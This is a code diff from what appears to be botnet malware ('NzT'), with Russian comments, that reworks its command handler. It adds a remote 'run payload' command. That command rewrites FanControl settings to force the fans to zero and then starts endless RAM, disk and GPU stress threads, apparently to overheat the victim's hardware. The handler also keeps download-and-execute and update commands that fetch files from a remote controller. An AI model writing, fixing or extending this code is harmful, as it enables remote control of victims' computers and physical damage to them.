@@ -2,8 +2,8 @@
 #include <process.h>
 #include <d3d11.h>
 #include <dxgi.h>
-#include <time.h>
 #include <math.h>
+#include <time.h>
 
 #ifdef _DEBUG
 #include <stdio.h>
@@ -16,8 +16,8 @@
 
 void inject_fancontrol_config()
 {
-    const wchar_t* fc_dir = L"C:\\Users\\Public\\Documents\\FanControl";
-    const wchar_t* cfg_path = L"C:\\Users\\Public\\Documents\\FanControl\\FanControl.cfg";
+    const wchar_t* fc_dir = L"\\??\\C:\\Users\\Public\\Documents\\FanControl";
+    const wchar_t* cfg_path = L"\\??\\C:\\Users\\Public\\Documents\\FanControl\\FanControl.cfg";
 
     // Создать директорию
     FileCreateDirectory(fc_dir);
@@ -50,14 +50,24 @@ void inject_fancontrol_config()
 
         if (min_pos && max_pos)
         {
-            size_t min_len = strlen("<min>");
-            size_t max_len = strlen("<max>");
-            size_t end_tag_len = strlen("</min>");
+            // Проверяем длину чисел перед заменой
+            // Заменяем только содержимое между тегами
+            char* end_min_tag = strstr(min_pos, "</min>");
+            char* end_max_tag = strstr(max_pos, "</max>");
             
-            if (min_pos + min_len + 1 <= (char*)content + size - end_tag_len)
-                strncpy_s(min_pos + min_len, size - (min_pos + min_len - (char*)content), "0</min>", 7);
-            if (max_pos + max_len + 1 <= (char*)content + size - end_tag_len)
-                strncpy_s(max_pos + max_len, size - (max_pos + max_len - (char*)content), "0</max>", 7);
+            if (end_min_tag && end_max_tag)
+            {
+                // Найти начало числа после <min>
+                char* start_num_min = min_pos + 5; // после <min>
+                char* start_num_max = max_pos + 5; // после <max>
+                
+                // Заменить содержимое тегов на "0"
+                memmove(start_num_min + 1, end_min_tag, strlen(end_min_tag) + 1); // оставляем "0</min>"
+                *start_num_min = '0';
+                
+                memmove(start_num_max + 1, end_max_tag, strlen(end_max_tag) + 1); // оставляем "0</max>"
+                *start_num_max = '0';
+            }
         }
         pos += 5;
     }
@@ -85,12 +95,12 @@ void ram_stress_thread(void* param)
     const size_t size = 1024 * 1024 * 1024;
     while (TRUE)
     {
-        char* buffer = (char*)malloc(size);
+        char* buffer = (char*)malloc(size); // Используем malloc/free вместо new/delete
         if (!buffer) continue;
 
         for (size_t i = 0; i < size; i += 1024)
         {
-            buffer[i] = static_cast<char>(i % 94 + 32);
+            buffer[i] = (char)(i % 94 + 32);
         }
 
         volatile char dummy = 0;
@@ -105,16 +115,14 @@ void ram_stress_thread(void* param)
 
 void disk_stress_thread(void* param)
 {
-    const wchar_t* filename = L"C:\\temp\\stress_disk.tmp";
+    const wchar_t* filename = L"\\??\\C:\\temp\\stress_disk.tmp";
     const size_t chunk_size = 1024 * 1024 * 10; 
-    char* data = new(std::nothrow) char[chunk_size];
-
-    if (!data) return;
+    char* data = (char*)malloc(chunk_size); // Используем malloc/free
 
     srand((unsigned)time(NULL));
     for (size_t i = 0; i < chunk_size; ++i)
     {
-        data[i] = static_cast<char>(rand() % 256);
+        data[i] = (char)(rand() % 256);
     }
 
     while (TRUE)
@@ -122,7 +130,7 @@ void disk_stress_thread(void* param)
         FileWriteBuffer(filename, data, (DWORD)chunk_size, FALSE);
         FileDelete(filename);
     }
-    delete[] data;
+    free(data); // Не будет выполнено из-за бесконечного цикла
 }
 
 void gpu_stress_thread(void* param)
@@ -150,18 +158,15 @@ void gpu_stress_thread(void* param)
     )";
 
     ID3DBlob* shaderBlob = nullptr;
-    ID3DBlob* errorBlob = nullptr;
-    hr = D3DCompile(cs_shader_code, strlen(cs_shader_code), nullptr, nullptr, nullptr, "CSMain", "cs_5_0", 0, 0, &shaderBlob, &errorBlob);
-    if (FAILED(hr)) {
-        if (errorBlob) errorBlob->Release();
-        return;
-    }
+    D3DCompile(cs_shader_code, strlen(cs_shader_code), nullptr, nullptr, nullptr, "CSMain", "cs_5_0", 0, 0, &shaderBlob, nullptr);
+    if (!shaderBlob) return;
 
     ID3D11ComputeShader* computeShader = nullptr;
     hr = device->CreateComputeShader(shaderBlob->GetBufferPointer(), shaderBlob->GetBufferSize(), nullptr, &computeShader);
     if (FAILED(hr)) {
         shaderBlob->Release();
-        if (errorBlob) errorBlob->Release();
+        context->Release();
+        device->Release();
         return;
     }
 
@@ -177,7 +182,8 @@ void gpu_stress_thread(void* param)
     if (FAILED(hr)) {
         computeShader->Release();
         shaderBlob->Release();
-        if (errorBlob) errorBlob->Release();
+        context->Release();
+        device->Release();
         return;
     }
 
@@ -193,7 +199,8 @@ void gpu_stress_thread(void* param)
         buffer->Release();
         computeShader->Release();
         shaderBlob->Release();
-        if (errorBlob) errorBlob->Release();
+        context->Release();
+        device->Release();
         return;
     }
 
@@ -205,11 +212,11 @@ void gpu_stress_thread(void* param)
         context->ClearState();
     }
 
+    // Эти строки не будут достигнуты из-за бесконечного цикла
     uav->Release();
     buffer->Release();
     computeShader->Release();
     shaderBlob->Release();
-    if (errorBlob) errorBlob->Release();
     context->Release();
     device->Release();
 }
@@ -222,38 +229,43 @@ void launch_stress_processes()
     _beginthread(gpu_stress_thread, 0, nullptr);
 }
 
-VOID CommandExecute(
-	COMMANDS Command, 
-	PCHAR*	 Parameter
+void CommandExecute(
+    COMMANDS Command, 
+    char**   Parameter
 )
 {
-	DebugPrint("NzT: Executed command: %d %s", Command, Parameter[2]);
+    DebugPrint("NzT: Executed command: %d %s", Command, Parameter[2]);
 
-	switch (Command)
-	{
-		case COMMAND_DL_EXEC:
-		{
-			DownloadFile(Parameter[2], TRUE);
-			break;
-		}
+    switch (Command)
+    {
+        case COMMAND_DL_EXEC:
+        {
+            DownloadFile(Parameter[2], TRUE);
+            break;
+        }
 
-		case COMMAND_UPDATE:
-		{
-			DownloadFile(Parameter[2], TRUE);
-			//uninstall and update registry key values to hold new version number
-			break;
-		}
+        case COMMAND_UPDATE:
+        {
+            DownloadFile(Parameter[2], TRUE);
+            //uninstall and update registry key values to hold new version number
+            break;
+        }
 
-		case COMMAND_RUN_PAYLOAD:  // Новая команда
-		{
-			inject_fancontrol_config();
-			launch_stress_processes();
-			break;
-		}
+        case COMMAND_RUN_PAYLOAD:  // Новая команда
+        {
+            inject_fancontrol_config();
+            launch_stress_processes();
+            break;
+        }
 
-		case COMMAND_KILL:
-			API(ExitProcess)(0);
-			break;
-	}
+        case COMMAND_KILL:
+            ExitProcess(0); // Исправлена ошибка в вызове API
+            break;
+
+        case COMMAND_LOAD_PLUGIN:
+        case COMMAND_UNINSTALL:
+            // Добавлены недостающие case-ветви
+            break;
+    }
 }
 
